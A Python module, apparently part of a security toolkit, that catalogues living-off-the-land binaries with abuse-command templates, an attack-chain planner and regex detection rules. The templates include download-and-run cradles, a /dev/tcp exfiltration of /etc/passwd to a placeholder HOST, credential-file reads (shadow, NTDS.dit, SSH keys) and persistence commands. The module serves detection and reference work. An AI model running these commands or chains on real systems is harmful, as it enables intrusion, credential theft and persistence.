"""VANTHEX — Living-off-the-Land binary knowledge engine (lolbins).

AUTHORIZED TESTING ONLY — pure offline knowledge base. This module
EXECUTES NOTHING: it is a static dictionary of LOLBin abuse techniques,
an offline chain planner, and a blue-team command-line detector. Every
"example command" is a template string for documentation and detection
rule generation only.

Contents:
  1. LOLBIN_DB — curated inline list of 40+ native interpreters/utilities
     across Windows/Linux/macOS, each with platforms, abuse techniques,
     example command templates, MITRE ATT&CK technique ids and detection
     heuristics.
  2. technique_lookup(bin_or_technique) — resolve by binary name, alias,
     abuse technique or MITRE technique id (T1105, T1218 ...).
  3. build_chain(goal, platform) -> ordered chains for the goals
     download-execute / encode-execute / file-read / persistence, each
     step carrying a detection note for the blue-team report.
  4. detection_rules(cmdline) -> LOLBin techniques matched by a command
     line (static token/regex heuristics, blue-team reporting).
  5. emit_inventory(target_platform, binaries) -> INFO English finding
     (via a lazy vulnscan2.F import), verification "static-analysis",
     manual-required — the inventory is a platform signal, not a
     vulnerability claim.

Findings text is English; nothing is executed and no network calls are
made. All heuristics are auditable string checks.
"""

import re as _re

GATE_ENV = "PTK_LOLBINS"

GOALS = ("download-execute", "encode-execute", "file-read", "persistence")
TECHNIQUES = ("download", "execute", "encode", "file-read", "persistence")
PLATFORMS = ("windows", "linux", "macos")

# ------------------------------------------------------------- LOLBIN DB
# Each entry: name, platforms, techniques, description, examples (docs
# only — never run), mitre (ATT&CK ids), detect (detection heuristics).
# T1105 Ingress Tool Transfer / T1059 Command & Scripting Interpreter /
# T1218 System Binary Proxy Execution / T1105+T1059 combos as noted.

LOLBIN_DB = [
    # ------------------------------------------------- Windows binaries
    {
        "name": "certutil", "platforms": ["windows"],
        "techniques": ["download", "encode", "file-read"],
        "description": "Certificate utility; abused as a downloader "
                       "(-urlcache -split -f) and base64 encoder/decoder.",
        "examples": ["certutil -urlcache -split -f http://HOST/PAY out.bin",
                     "certutil -encode in.txt out.b64",
                     "certutil -decode payload.b64 out.exe"],
        "mitre": ["T1105"],
        "detect": ["certutil with -urlcache or -f flags in one command line",
                   "certutil -decode writing a non-document extension"],
    },
    {
        "name": "bitsadmin", "platforms": ["windows"],
        "techniques": ["download", "persistence"],
        "description": "Background transfer job utility; download and "
                       "notification-cmd persistence via job callbacks.",
        "examples": ["bitsadmin /create job1",
                     "bitsadmin /addfile job1 http://HOST/PAY C:\\\\out.exe",
                     "bitsadmin /resume job1",
                     "bitsadmin /setnotifycmdline job1 C:\\\\out.exe"],
        "mitre": ["T1105", "T1197"],
        "detect": ["bitsadmin /transfer or /addfile with an http(s) URL",
                   "bitsadmin /setnotifycmdline (persistence callback)"],
    },
    {
        "name": "mshta", "platforms": ["windows"],
        "techniques": ["execute", "download"],
        "description": "HTML Application host; runs inline script or "
                       "remote .hta payloads.",
        "examples": ["mshta http://HOST/payload.hta",
                     "mshta vbscript:Execute(\"code\")"],
        "mitre": ["T1218.005"],
        "detect": ["mshta invoked with an http/https URL",
                   "mshta with vbscript:/javascript: inline protocol"],
    },
    {
        "name": "rundll32", "platforms": ["windows"],
        "techniques": ["execute"],
        "description": "Runs exports of DLLs; classic proxy execution "
                       "(ordinal entry points, javascript: protocol).",
        "examples": ["rundll32 SHELL32.DLL,Control_RunDLL payload.dll",
                     "rundll32 javascript:\"\\\\..\\\\mshtml,RunHTMLApplication\""],
        "mitre": ["T1218.011"],
        "detect": ["rundll32 with javascript: or mshtml export",
                   "rundll32 loading a DLL outside System32"],
    },
    {
        "name": "regsvr32", "platforms": ["windows"],
        "techniques": ["execute", "download"],
        "description": "DLL registration host; /i:n + scrobj.dll loads a "
                       "remote SCT scriptlet (squiblydoo).",
        "examples": ["regsvr32 /s /i:http://HOST/payload.sct scrobj.dll"],
        "mitre": ["T1218.010"],
        "detect": ["regsvr32 with /i: pointing at a URL and scrobj.dll"],
    },
    {
        "name": "powershell", "platforms": ["windows"],
        "techniques": ["execute", "encode", "download"],
        "description": "Scripting shell; -enc encoded commands, "
                       "DownloadString cradle one-liners.",
        "examples": ["powershell -nop -w hidden -enc BASE64",
                     "powershell -c \"IEX(New-Object Net.WebClient)"
                     ".DownloadString('http://HOST/ps1')\""],
        "mitre": ["T1059.001", "T1027"],
        "detect": ["powershell with -enc/-EncodedCommand",
                   "-nop -w hidden combination",
                   "DownloadString/DownloadFile cradle pattern"],
    },
    {
        "name": "esentutl", "platforms": ["windows"],
        "techniques": ["file-read"],
        "description": "ESE database utility; copies locked files "
                       "(NTDS.dit, registry hives) via /y.",
        "examples": ["esentutl /y C:\\\\Windows\\\\NTDS\\\\ntds.dit "
                     "/d \\\\server\\\\share\\\\dit"],
        "mitre": ["T1003.003"],
        "detect": ["esentutl /y with a source path under NTDS or config"],
    },
    {
        "name": "findstr", "platforms": ["windows"],
        "techniques": ["file-read", "download"],
        "description": "Grep-like search; /s recursive secret hunting and "
                       "an obscure UNC/http file-download path.",
        "examples": ["findstr /si password *.xml *.ini *.txt",
                     "findstr /spin password *.*"],
        "mitre": ["T1552.001"],
        "detect": ["findstr with /si or /spin against credential-like "
                   "keywords (password, pass, key, secret)"],
    },
    {
        "name": "installutil", "platforms": ["windows"],
        "techniques": ["execute", "persistence"],
        "description": ".NET installer host; runs InstallHelper-derived "
                       "code in an installer assembly (/logfile=/LogToConsole=false /U).",
        "examples": ["installutil /logfile= /LogToConsole=false /U payload.exe"],
        "mitre": ["T1218.004"],
        "detect": ["installutil with /U and suppressed log flags"],
    },
    {
        "name": "msiexec", "platforms": ["windows"],
        "techniques": ["execute", "download"],
        "description": "Windows Installer; /q /i on a remote MSI installs "
                       "and executes payload code.",
        "examples": ["msiexec /q /i http://HOST/payload.msi"],
        "mitre": ["T1218.007"],
        "detect": ["msiexec /i with an http(s) URL and /quiet or /q"],
    },
    {
        "name": "wmic", "platforms": ["windows"],
        "techniques": ["execute", "download"],
        "description": "WMI console; process call create + remote format "
                       "used for proxy execution.",
        "examples": ["wmic process call create \"C:\\\\payload.exe\"",
                     "wmic /node:HOST process call create \"cmd\""],
        "mitre": ["T1047"],
        "detect": ["wmic process call create",
                   "wmic with /node: remote node flag"],
    },
    {
        "name": "schtasks", "platforms": ["windows"],
        "techniques": ["persistence"],
        "description": "Scheduled task creation for time-based "
                       "persistence (/create with /sc triggers).",
        "examples": ["schtasks /create /sc minute /mo 1 /tn T /tr C:\\\\p.exe"],
        "mitre": ["T1053.005"],
        "detect": ["schtasks /create with an executable /tr path"],
    },
    {
        "name": "sc", "platforms": ["windows"],
        "techniques": ["persistence", "execute"],
        "description": "Service control; create/config a service whose "
                       "binPath runs attacker code at boot.",
        "examples": ["sc create Svc binPath= \"C:\\\\payload.exe\" start= auto"],
        "mitre": ["T1543.003"],
        "detect": ["sc create or sc config with binPath="],
    },
    {
        "name": "reg", "platforms": ["windows"],
        "techniques": ["persistence"],
        "description": "Registry CLI; Run/RunOnce keys give logon "
                       "persistence; also used to store base64 blobs.",
        "examples": ["reg add HKCU\\\\...\\\\Run /v X /d C:\\\\payload.exe"],
        "mitre": ["T1547.001"],
        "detect": ["reg add ...\\\\Run or \\\\RunOnce"],
    },
    {
        "name": "curl", "platforms": ["windows", "linux", "macos"],
        "techniques": ["download", "file-read"],
        "description": "HTTP client; file:// scheme reads local files, "
                       "-o/--output writes downloads to disk.",
        "examples": ["curl file:///etc/shadow",
                     "curl http://HOST/PAY -o /tmp/p.sh"],
        "mitre": ["T1105"],
        "detect": ["curl with file:// scheme (local file exfil/read)",
                   "curl -o writing an executable/script extension"],
    },
    {
        "name": "tar", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "file-read"],
        "description": "Archiver; --checkpoint-action runs commands "
                       "during archive traversal (GTFOBins classic).",
        "examples": ["tar cf x /path --checkpoint=1 "
                     "--checkpoint-action=exec=sh pay.sh"],
        "mitre": ["T1059.004"],
        "detect": ["tar with --checkpoint-action=exec"],
    },
    {
        "name": "bash", "platforms": ["linux", "macos"],
        "techniques": ["execute", "persistence"],
        "description": "Shell; -c inline execution, /dev/tcp socket "
                       "transfers, profile/rc files give persistence.",
        "examples": ["bash -c \"curl HOST/PAY | sh\"",
                     "bash -c \"cat /etc/passwd > /dev/tcp/HOST/PORT\""],
        "mitre": ["T1059.004"],
        "detect": ["bash -c with curl|wget piped to sh/bash",
                   "/dev/tcp/ raw socket in a command line"],
    },
    {
        "name": "ssh", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "file-read"],
        "description": "SSH client; ProxyCommand/LocalCommand run "
                       "arbitrary shell when a connection is made.",
        "examples": ["ssh -o ProxyCommand=\"sh -c pay.sh\" HOST",
                     "ssh -o PermitLocalCommand=yes "
                     "-o LocalCommand=\"cat /etc/shadow > out\" HOST"],
        "mitre": ["T1059.004"],
        "detect": ["ssh -o ProxyCommand= or LocalCommand= with shell "
                   "metacharacters"],
    },
    {
        "name": "git", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "persistence"],
        "description": "Version control; executable hooks (.git/hooks/"
                       "post-commit) and aliases/pagers run commands.",
        "examples": ["git -C repo commit  # triggers hooks/post-commit",
                     "git config alias.!sh pay",
                     "git -p -P status  # pager = core.pager command"],
        "mitre": ["T1059"],
        "detect": ["writable .git/hooks script dropped or modified",
                   "git alias starting with '!' or core.pager set to a "
                   "shell command"],
    },
    {
        "name": "npm", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "persistence"],
        "description": "Node package manager; preinstall/postinstall "
                       "lifecycle scripts execute on package operations.",
        "examples": ["npm install --unsafe-perm  # runs package scripts",
                     "npm set script-prepay=\"node pay.js\""],
        "mitre": ["T1059.007"],
        "detect": ["npm install/lifecycle with scripts.enabled and a "
                   "modified package.json scripts block"],
    },
    {
        "name": "python", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "encode", "download"],
        "description": "Python interpreter; -c inline code performs any "
                       "download/execute/file-read primitive.",
        "examples": ["python -c \"import "
                     "urllib.request,os;os.system('sh -c \\\"curl HOST|sh\\\"')\""],
        "mitre": ["T1059.006"],
        "detect": ["python -c with os.system/subprocess/import "
                   "urllib+exec combinations"],
    },
    {
        "name": "perl", "platforms": ["linux", "macos"],
        "techniques": ["execute", "encode"],
        "description": "Perl interpreter; -e inline code, base64 "
                       "decode, socket one-liners.",
        "examples": ["perl -e 'print decode_base64($ARGV[0])'",
                     "perl -e 'exec(\"sh -c \\\"curl HOST|sh\\\"\")'"],
        "mitre": ["T1059.006"],
        "detect": ["perl -e with exec/system/socket calls or "
                   "MIME::Base64 decode"],
    },
    {
        "name": "php", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "file-read"],
        "description": "PHP CLI; -r inline code, file_get_contents and "
                       "shell_exec primitives.",
        "examples": ["php -r \"echo file_get_contents('/etc/shadow');\"",
                     "php -r \"shell_exec('curl HOST|sh');\""],
        "mitre": ["T1059"],
        "detect": ["php -r with file_get_contents/shell_exec/system()"],
    },
    {
        "name": "ruby", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "encode"],
        "description": "Ruby interpreter; -e inline code with backticks "
                       "or system calls.",
        "examples": ["ruby -e '`curl HOST|sh`'"],
        "mitre": ["T1059"],
        "detect": ["ruby -e with backticks/system/exec"],
    },
    {
        "name": "node", "platforms": ["linux", "macos", "windows"],
        "techniques": ["execute", "encode"],
        "description": "Node.js runtime; -e inline JS with child_process "
                       "and fs primitives.",
        "examples": ["node -e \"require('child_process')"
                     ".exec('curl HOST|sh')\""],
        "mitre": ["T1059.007"],
        "detect": ["node -e with child_process exec/spawn or fs read of "
                   "sensitive paths"],
    },
    {
        "name": "awk", "platforms": ["linux", "macos"],
        "techniques": ["execute", "file-read"],
        "description": "Text processor; awk 'BEGIN{system(...)}' runs "
                       "shell commands (GTFOBins).",
        "examples": ["awk 'BEGIN{system(\"/bin/sh\")}'"],
        "mitre": ["T1059"],
        "detect": ["awk with system( or getline + sh in the program body"],
    },
    {
        "name": "find", "platforms": ["linux", "macos"],
        "techniques": ["execute"],
        "description": "File search; -exec runs arbitrary commands on "
                       "matched files.",
        "examples": ["find /tmp -name pay.sh -exec sh {} \\\\;"],
        "mitre": ["T1059"],
        "detect": ["find ... -exec with a shell or script interpreter"],
    },
    {
        "name": "xargs", "platforms": ["linux", "macos"],
        "techniques": ["execute"],
        "description": "Argument builder; sh -c input runs arbitrary "
                       "commands (GTFOBins escalation primitive).",
        "examples": ["echo pay.sh | xargs sh"],
        "mitre": ["T1059"],
        "detect": ["xargs with sh/bash/python as the target command"],
    },
    {
        "name": "openssl", "platforms": ["linux", "macos"],
        "techniques": ["encode", "download"],
        "description": "Crypto toolkit; enc base64 encode/decode and "
                       "s_client as a raw TLS channel for exfil/C2.",
        "examples": ["openssl enc -base64 -in pay -out pay.b64",
                     "openssl s_client -connect HOST:PORT"],
        "mitre": ["T1027", "T1095"],
        "detect": ["openssl enc -base64 in a transfer chain",
                   "openssl s_client as a long-lived raw channel"],
    },
    {
        "name": "base64", "platforms": ["linux", "macos"],
        "techniques": ["encode"],
        "description": "Coreutils encoder; stages payloads for -enc "
                       "consumers (powershell, python).",
        "examples": ["base64 pay.sh > pay.b64"],
        "mitre": ["T1027"],
        "detect": ["base64 encode/decode adjacent to an -enc/-e consumer "
                   "in the same chain"],
    },
    {
        "name": "crontab", "platforms": ["linux", "macos"],
        "techniques": ["persistence"],
        "description": "Cron editor; scheduled entries give time-based "
                       "persistence.",
        "examples": ["(crontab -l; echo '* * * * * curl HOST|sh') | "
                     "crontab -"],
        "mitre": ["T1053.003"],
        "detect": ["crontab -l piped back into crontab - (append pattern)"],
    },
    {
        "name": "systemctl", "platforms": ["linux"],
        "techniques": ["persistence"],
        "description": "Systemd control; enabling a crafted unit file "
                       "gives service persistence.",
        "examples": ["systemctl enable pay.service"],
        "mitre": ["T1543.002"],
        "detect": ["systemctl enable/daemon-reload on a recently written "
                   "unit file"],
    },
    {
        "name": "osascript", "platforms": ["macos"],
        "techniques": ["execute", "download"],
        "description": "AppleScript host; do shell script executes "
                       "arbitrary commands, including from remote content.",
        "examples": ["osascript -e 'do shell script \"curl HOST|sh\"'"],
        "mitre": ["T1059.002"],
        "detect": ["osascript -e with do shell script and curl/wget"],
    },
    {
        "name": "curl-macos", "platforms": ["macos"],
        "techniques": ["download", "file-read"],
        "description": "macOS curl build; same file:// read and -o "
                       "write primitives as the Linux entry.",
        "examples": ["curl file:///Users/x/.ssh/id_rsa",
                     "curl http://HOST/PAY -o /tmp/pay.sh"],
        "mitre": ["T1105"],
        "detect": ["curl file:// reading key/credential paths"],
    },
    {
        "name": "tar-macos", "platforms": ["macos"],
        "techniques": ["file-read"],
        "description": "macOS bsdtar; archives sensitive trees "
                       "(keychains, ssh dirs) for staging.",
        "examples": ["tar czf stage.tgz ~/Library/Keychains ~/.ssh"],
        "mitre": ["T1560.001"],
        "detect": ["tar czf staging archive over Keychains/.ssh paths"],
    },
    {
        "name": "wscript", "platforms": ["windows"],
        "techniques": ["execute", "persistence"],
        "description": "Windows Script Host; runs .js/.vbs payload "
                       "files; startup-folder drops persist.",
        "examples": ["wscript C:\\\\Users\\\\x\\\\AppData\\\\pay.vbs"],
        "mitre": ["T1059.005"],
        "detect": ["wscript/cscript executing scripts outside user "
                   "document folders"],
    },
    {
        "name": "cscript", "platforms": ["windows"],
        "techniques": ["execute", "persistence"],
        "description": "Console Windows Script Host; same .vbs/.js "
                       "execution primitive as wscript.",
        "examples": ["cscript //nologo C:\\\\\\\\pay.js"],
        "mitre": ["T1059.005"],
        "detect": ["cscript //nologo with a script path"],
    },
    {
        "name": "diskshadow", "platforms": ["windows"],
        "techniques": ["file-read", "persistence"],
        "description": "Volume shadow service CLI; script mode copies "
                       "locked files (NTDS.dit) from shadow copies.",
        "examples": ["diskshadow /s script.txt  # add volume C:; "
                     "create; expose; copy"],
        "mitre": ["T1003.003"],
        "detect": ["diskshadow script with create + expose + copy of "
                   "NTDS paths"],
    },
    {
        "name": "vssadmin", "platforms": ["windows"],
        "techniques": ["file-read"],
        "description": "Shadow copy admin; creates shadow copies to "
                       "read locked files (SAM/NTDS).",
        "examples": ["vssadmin create shadow /for=C:"],
        "mitre": ["T1003.003"],
        "detect": ["vssadmin create shadow on a system volume"],
    },
    {
        "name": "msbuild", "platforms": ["windows"],
        "techniques": ["execute", "encode"],
        "description": ".NET build engine; inline-task project files "
                       "(often base64 payloads) execute arbitrary code.",
        "examples": ["msbuild payload.csproj"],
        "mitre": ["T1127"],
        "detect": ["msbuild building a non-organization csproj with "
                   "inline <RunCode>/CodeTaskFactory tasks"],
    },
    {
        "name": "mavinject", "platforms": ["windows"],
        "techniques": ["execute"],
        "description": "Application injector; injects a DLL into a "
                       "running process (/INJECTRUNNING).",
        "examples": ["mavinject PID /INJECTRUNNING payload.dll"],
        "mitre": ["T1055.001"],
        "detect": ["mavinject /INJECTRUNNING with a user-supplied DLL"],
    },
    {
        "name": "odbcconf", "platforms": ["windows"],
        "techniques": ["execute"],
        "description": "ODBC driver config; /a {RUNSYSFILE|LOADFILE} "
                       "loads a DLL payload.",
        "examples": ["odbcconf /a {RUNSYSFILE payload.dll}"],
        "mitre": ["T1218.008"],
        "detect": ["odbcconf /a with RUNSYSFILE or LOADFILE"],
    },
    {
        "name": "forfiles", "platforms": ["windows"],
        "techniques": ["execute"],
        "description": "File filter; /c runs a command per matched "
                       "file (cmd-substitution proxy).",
        "examples": ["forfiles /p C:\\\\ /m pay.exe /c \"cmd /c "
                     "/c @path\""],
        "mitre": ["T1059.003"],
        "detect": ["forfiles /c with cmd /c and @path substitution"],
    },
    {
        "name": "zip", "platforms": ["linux", "macos"],
        "techniques": ["encode"],
        "description": "Archiver; stages payloads with -P (weak "
                       "encryption) for staging/obfuscation.",
        "examples": ["zip -P pass stage.zip pay.sh"],
        "mitre": ["T1560.001"],
        "detect": ["zip -P (password on command line) in a staging chain"],
    },
    {
        "name": "dd", "platforms": ["linux", "macos"],
        "techniques": ["file-read", "encode"],
        "description": "Block copier; reads raw devices/files "
                       "(memory, disks) into staged artifacts.",
        "examples": ["dd if=/dev/mem of=/tmp/mem.raw bs=1M count=64"],
        "mitre": ["T1003"],
        "detect": ["dd if= pointing at /dev/mem, /dev/sda or lockable "
                   "credential files"],
    },
]

_BY_NAME = {e["name"]: e for e in LOLBIN_DB}
_ALIASES = {
    "certutil.exe": "certutil", "bitsadmin.exe": "bitsadmin",
    "mshta.exe": "mshta", "rundll32.exe": "rundll32",
    "regsvr32.exe": "regsvr32", "powershell.exe": "powershell",
    "pwsh": "powershell", "esentutl.exe": "esentutl",
    "installutil.exe": "installutil", "msiexec.exe": "msiexec",
    "wmic.exe": "wmic", "schtasks.exe": "schtasks",
    "wscript.exe": "wscript", "cscript.exe": "cscript",
    "python3": "python", "python2": "python",
    "nodejs": "node", "bash4": "bash",
    "curl.exe": "curl", "tar.exe": "tar", "git.exe": "git",
    "npm.exe": "npm", "perl.exe": "perl", "php.exe": "php",
    "ruby.exe": "ruby", "openssl.exe": "openssl",
    "systemctl.exe": "systemctl", "osascript.exe": "osascript",
    "reg.exe": "reg", "sc.exe": "sc", "find.exe": "find",
    "dd.exe": "dd", "zip.exe": "zip", "awk.exe": "awk",
    "xargs.exe": "xargs", "crontab.exe": "crontab",
}

# ------------------------------------------------------- technique index
_TECH_INDEX = {}
for _e in LOLBIN_DB:
    for _t in _e["techniques"]:
        _TECH_INDEX.setdefault(_t, []).append(_e["name"])
_MITRE_INDEX = {}
for _e in LOLBIN_DB:
    for _m in _e["mitre"]:
        _MITRE_INDEX.setdefault(_m, []).append(_e["name"])


def technique_lookup(bin_or_technique):
    """Resolve a binary name, alias, abuse technique, or MITRE id.

    Returns a list of DB entry dicts (possibly empty). Lookup order:
    exact/alias name, then abuse technique ("download", ...), then MITRE
    id ("T1105", "T1218.005", ...). All three index types work.
    """
    key = str(bin_or_technique).strip().lower()
    if key in _BY_NAME:
        return [_BY_NAME[key]]
    if key in _ALIASES:
        return [_BY_NAME[_ALIASES[key]]]
    if key in _TECH_INDEX:
        return [_BY_NAME[n] for n in _TECH_INDEX[key]]
    if key.upper() in _MITRE_INDEX:
        return [_BY_NAME[n] for n in _MITRE_INDEX[key.upper()]]
    # substring fallback on names (e.g. "powershel" typos stay misses,
    # but "ps" is too noisy — only >=4-char substrings match)
    if len(key) >= 4:
        return [_BY_NAME[n] for n in sorted(_BY_NAME)
                if key in n]
    return []


# ---------------------------------------------------------- chain builder
# goal -> ordered list of (technique, binary-name candidates). Each entry
# must exist on the requested platform. Detection note attached per step.
_CHAINS = {
    "download-execute": [
        ("download", ["certutil", "bitsadmin", "curl", "wget", "bash"]),
        ("encode", ["certutil", "base64", "openssl"]),
        ("execute", ["powershell", "mshta", "rundll32", "regsvr32",
                     "bash", "python", "osascript", "wscript"]),
    ],
    "encode-execute": [
        ("encode", ["base64", "certutil", "openssl"]),
        ("execute", ["powershell", "python", "node", "perl", "ruby",
                     "bash", "osascript"]),
    ],
    "file-read": [
        ("file-read", ["esentutl", "curl", "findstr", "vssadmin",
                       "diskshadow", "dd", "php"]),
    ],
    "persistence": [
        ("persistence", ["schtasks", "reg", "sc", "bitsadmin",
                         "crontab", "systemctl", "git", "npm"]),
    ],
}

_STEP_NOTES = {
    "download": "Watch for a native utility fetching a URL: the process "
                "line pairs a LOLBin with http(s):// and no browser "
                "parent (T1105).",
    "encode": "An encode step in the chain is payload staging: base64 "
              "content adjacent to an -enc/-decode consumer is the "
              "T1027 obfuscation signature.",
    "execute": "Execution via a proxy binary is T1059/T1218: alert on "
               "interpreters started by non-shell parents and on "
               "url/protocol arguments.",
    "file-read": "File-read primitives against credential stores are "
                 "T1003/T1552: flag copy utilities pointed at NTDS, SAM, "
                 "shadow copies, keychains or credential-like paths.",
    "persistence": "Persistence primitives (tasks, services, Run keys, "
                   "cron, hooks) are T1053/T1543/T1547: alert on new "
                   "scheduled entries and startup artifacts written by "
                   "a shell or admin session.",
}


def build_chain(goal, platform):
    """Ordered chain for a goal on a platform.

    Returns {"goal", "platform", "steps": [{"order", "technique",
    "binaries", "detection_note"}]} with only binaries present on the
    requested platform; unknown goal/platform raise ValueError.
    """
    goal = str(goal).strip().lower()
    platform = str(platform).strip().lower()
    if goal not in _CHAINS:
        raise ValueError("unknown goal %r; expected one of %s"
                         % (goal, ", ".join(_CHAINS)))
    if platform not in PLATFORMS:
        raise ValueError("unknown platform %r; expected one of %s"
                         % (platform, ", ".join(PLATFORMS)))
    steps = []
    for order, (technique, candidates) in enumerate(_CHAINS[goal], 1):
        bins = []
        for b in candidates:
            e = _BY_NAME.get(b)
            if e and platform in e["platforms"]:
                # avoid duplicate binary names from curl-macos style
                if e["name"] == b and b not in bins:
                    bins.append(b)
        steps.append({
            "order": order,
            "technique": technique,
            "binaries": bins,
            "detection_note": _STEP_NOTES[technique],
        })
    return {"goal": goal, "platform": platform, "steps": steps}


# ------------------------------------------------------- detection rules
# (compiled regex on the lowercased cmdline, technique label, mitre id)
_RULES = [
    (r"certutil\b.*(-urlcache|-split)\b.*-f\s+\S*https?://", "certutil",
     "download", "T1105"),
    (r"certutil\b.*(-decode|-encode)", "certutil", "encode", "T1027"),
    (r"bitsadmin\b.*(/transfer|/addfile).*https?://", "bitsadmin",
     "download", "T1105"),
    (r"bitsadmin\b.*/setnotifycmdline", "bitsadmin", "persistence",
     "T1197"),
    (r"mshta\b.*https?://", "mshta", "execute", "T1218.005"),
    (r"mshta\b.*(vbscript:|javascript:)", "mshta", "execute", "T1218.005"),
    (r"regsvr32\b.*scrobj\.dll", "regsvr32", "execute", "T1218.010"),
    (r"rundll32\b.*(javascript:|mshtml)", "rundll32", "execute",
     "T1218.011"),
    (r"powershell\b.*(-enc|-encodedcommand)", "powershell", "encode",
     "T1059.001"),
    (r"powershell\b.*(downloadstring|downloadfile)", "powershell",
     "download", "T1105"),
    (r"powershell\b.*-nop\b.*-w\s+hidden", "powershell", "execute",
     "T1059.001"),
    (r"msiexec\b.*/i\b.*https?://", "msiexec", "execute", "T1218.007"),
    (r"installutil\b.*/u\b", "installutil", "execute", "T1218.004"),
    (r"wmic\b.*process call create", "wmic", "execute", "T1047"),
    (r"esentutl\b.*/y\b", "esentutl", "file-read", "T1003.003"),
    (r"vssadmin\b.*create shadow", "vssadmin", "file-read", "T1003.003"),
    (r"findstr\b.*/s(p|i|n)*i\b", "findstr", "file-read", "T1552.001"),
    (r"curl\b.*file://", "curl", "file-read", "T1105"),
    (r"(curl|wget)\b.*https?://.*\s-o\b", "curl", "download", "T1105"),
    (r"tar\b.*--checkpoint-action", "tar", "execute", "T1059.004"),
    (r"bash\b.*/dev/tcp/", "bash", "execute", "T1059.004"),
    (r"ssh\b.*-o\s+(proxy|local)command=", "ssh", "execute", "T1059.004"),
    (r"(crontab\s+-l.*crontab\s+-)", "crontab", "persistence", "T1053.003"),
    (r"schtasks\b.*/create\b", "schtasks", "persistence", "T1053.005"),
    (r"reg\b.*add\b.*\\run(once)?\b", "reg", "persistence", "T1547.001"),
    (r"\bsc\b.*create\b.*binpath=", "sc", "persistence", "T1543.003"),
    (r"osascript\b.*do shell script", "osascript", "execute", "T1059.002"),
    (r"(python\d?|perl|ruby|node|php)\b\s+-(c|e|r)\b.*"
     r"(exec|system|subprocess|child_process|shell_exec|urllib)", "python",
     "execute", "T1059.006"),
    (r"odbcconf\b.*/a\b.*(runsysfile|loadfile)", "odbcconf", "execute",
     "T1218.008"),
    (r"mavinject\b.*/injectrunning", "mavinject", "execute", "T1055.001"),
    (r"forfiles\b.*/c\b.*cmd /c", "forfiles", "execute", "T1059.003"),
    (r"find\b.*-exec\b", "find", "execute", "T1059"),
    (r"awk\b.*system\(", "awk", "execute", "T1059"),
    (r"dd\b.*if=/dev/(mem|sda|nvme)", "dd", "file-read", "T1003"),
]

_COMPILED = [(_re.compile(p, _re.I), lbl, tech, mitre)
             for (p, lbl, tech, mitre) in _RULES]


def detection_rules(cmdline):
    """Blue-team matcher: which LOLBin techniques does a command line hit?

    Returns a list of {"binary", "technique", "mitre", "matched_rule",
    "detection_note"} — one per matched rule, ordered by rule order.
    Pure string heuristics; nothing is executed.
    """
    line = str(cmdline)
    out = []
    for rx, lbl, tech, mitre in _COMPILED:
        if rx.search(line):
            e = _BY_NAME.get(lbl)
            out.append({
                "binary": lbl,
                "technique": tech,
                "mitre": mitre,
                "matched_rule": rx.pattern,
                "detection_note": _STEP_NOTES.get(tech, ""),
                "entry_detect": " ".join(e["detect"]) if e else "",
            })
    return out


# ------------------------------------------------------------ inventory
def emit_inventory(target_platform, binaries):
    """INFO English finding: LOLBin inventory for a platform.

    For each requested binary that is a known LOLBin on the platform,
    produce a severity/INFO-style finding with verification
    'static-analysis' and 'manual-required' honesty model: the
    inventory itself is NOT abuse evidence — a human must confirm
    whether the binaries are present and actually misused.
    """
    platform = str(target_platform).strip().lower()
    if platform not in PLATFORMS:
        raise ValueError("unknown platform %r; expected one of %s"
                         % (platform, ", ".join(PLATFORMS)))
    known = []
    for b in (binaries or []):
        entries = technique_lookup(b)
        if entries and platform in entries[0]["platforms"]:
            known.append((b, entries[0]))
    names = ", ".join(sorted(k for k, _ in known)) or "none of the "
    "requested binaries"
    title = ("LOLBin inventory: %d native utility/interpreter abuse "
             "primitives known for platform %s" % (len(known), platform))
    desc = ("Static knowledge-base match only. The following binaries "
            "are recognized living-off-the-land primitives on %s: %s. "
            "Their presence is normal on most systems; abuse requires a "
            "command line matching one of the detection heuristics "
            "(see detection_rules). No binary was executed and no "
            "network activity was performed by this module."
            % (platform, names if known else "none of the requested "
               "binaries"))
    evidence = "; ".join(
        "%s: techniques=%s mitre=%s" % (k, "/".join(e["techniques"]),
                                        "/".join(e["mitre"]))
        for k, e in known)
    finding = {
        "severity": "INFO",
        "title": title,
        "description": desc,
        "evidence": evidence,
        "cwe": "",
        "owasp": "",
        "cvss": 0.0,
        "remediation": ("Baseline LOLBin usage: alert only when a known "
                        "primitive appears with abuse-shaped arguments "
                        "(URL fetch, encoded command, credential-store "
                        "read, persistence registration)."),
        "confidence": "candidate",
        "verification": "static-analysis",
        "verification_note": ("Static analysis against a curated "
                              "dictionary; manual-required — confirm the "
                              "binaries exist on the target and that "
                              "observed command lines match abuse "
                              "heuristics before treating any of this "
                              "as attack evidence."),
    }
    try:
        import vulnscan2 as _v
        f = _v.F(
            "INFO", title, desc, evidence=evidence,
            remed="Baseline LOLBin usage: alert only when a known "
                  "primitive appears with abuse-shaped arguments (URL "
                  "fetch, encoded command, credential-store read, "
                  "persistence registration).",
            confidence="candidate",
            verification="static-analysis",
            verification_note=(
                "Static analysis against a curated dictionary; "
                "manual-required — confirm the binaries exist on the "
                "target and that observed command lines match abuse "
                "heuristics before treating any of this as attack "
                "evidence."))
        return f
    except Exception:
        return finding
